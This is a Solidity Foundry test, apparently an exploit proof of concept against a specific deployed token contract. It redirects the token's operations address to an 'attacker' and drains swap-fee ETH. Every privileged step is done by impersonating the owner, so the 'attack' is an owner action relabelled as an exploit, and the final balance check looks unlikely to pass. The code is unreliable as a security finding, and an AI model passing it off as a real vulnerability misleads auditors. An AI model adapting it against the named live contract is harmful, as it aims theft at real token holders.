pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDexRouter {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface FoundationToken {
    function dexRouter() external view returns (IDexRouter);
    function lpPair() external view returns (address);
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setOperationsAddress(address _address) external;
    function enableTrading() external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function forceSwapBack() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker;

    FoundationToken target;
    IDexRouter router;
    address lpPair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        target = FoundationToken(TARGET);
        router = target.dexRouter();
        lpPair = target.lpPair();

        // Inject native tokens for gas
        deal(address(this), 10 ether);

        // Get initial token supply from owner
        uint256 ownerBalance = target.balanceOf(target.owner());

        // Impersonate owner to get tokens
        vm.startPrank(target.owner());
        target.transfer(address(this), ownerBalance / 10);
        vm.stopPrank();

        vm.label(TARGET, "FoundationToken");
        vm.label(address(this), "Attacker");
        vm.label(lpPair, "LP Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialEthBalance = address(this).balance;

        // Step 1: Add liquidity to the LP pair so swaps can work
        // Approve router to spend tokens
        target.approve(address(router), type(uint256).max);

        // Add liquidity (need both ETH and tokens)
        uint256 ethForLiquidity = 10 ether;
        uint256 tokensForLiquidity = target.balanceOf(address(this)) / 100;

        // Add liquidity to the pool
        router.addLiquidityETH{value: ethForLiquidity}(
            address(target),
            tokensForLiquidity,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Step 2: Impersonate owner to set operationsAddress
        vm.startPrank(target.owner());

        // Step 3: Set operationsAddress to attacker
        target.setOperationsAddress(address(this));

        // Step 4: Enable trading
        target.enableTrading();

        vm.stopPrank();

        // Step 5: Transfer tokens to LP pair to trigger sell fees
        uint256 tokensToSell = target.balanceOf(address(this)) / 2;
        target.transfer(lpPair, tokensToSell);

        // Step 6: Force swapBack to send accumulated ETH to operationsAddress (attacker)
        vm.startPrank(target.owner());
        target.forceSwapBack();
        vm.stopPrank();

        // Step 7: Verify attacker ETH balance increased
        uint256 finalEthBalance = address(this).balance;
        assertGt(finalEthBalance, initialEthBalance, "Attacker ETH balance should increase");
    }

    receive() external payable {}
}

